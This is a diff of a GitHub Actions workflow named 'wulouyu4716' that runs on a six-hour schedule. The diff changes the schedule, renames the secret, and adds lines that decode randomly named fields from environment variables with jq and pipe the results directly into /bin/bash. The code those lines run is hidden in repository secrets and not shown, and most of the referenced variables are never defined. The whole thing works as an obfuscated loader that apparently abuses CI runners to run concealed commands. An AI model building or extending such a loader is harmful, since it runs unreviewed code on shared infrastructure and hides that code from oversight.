@@ -1,10 +1,10 @@
 name: wulouyu4716
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 0/6 * * *'
-
-jobs:  # 15062
+    - cron: '48 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,9 +12,13 @@ jobs:  # 15062
       - uses: actions/checkout@v4
       - name: wulouyu4716
         env:
-          uxp8: ${{ secrets.uxp8 }}
+          nhff253: ${{ secrets.nhff253 }}
         run: |
-          echo $uxp8 | jq -r .zvoks2 | /bin/bash
-          echo $u790 | jq -r .lksa1736 | /bin/bash
-          echo $kru7283 | jq -r .f0788 | /bin/bash
+          echo $nhff253 | jq -r .cc94363 | /bin/bash
+          echo $xg0335 | jq -r .c62365 | /bin/bash
+          echo $c49123 | jq -r .dr1 | /bin/bash
+          echo $ni2339 | jq -r .jt93495 | /bin/bash
+          echo $n80585 | jq -r .rj93384 | /bin/bash
+          echo $atcnc9 | jq -r .ozf610 | /bin/bash
+          echo $fu18057 | jq -r .i0 | /bin/bash
 
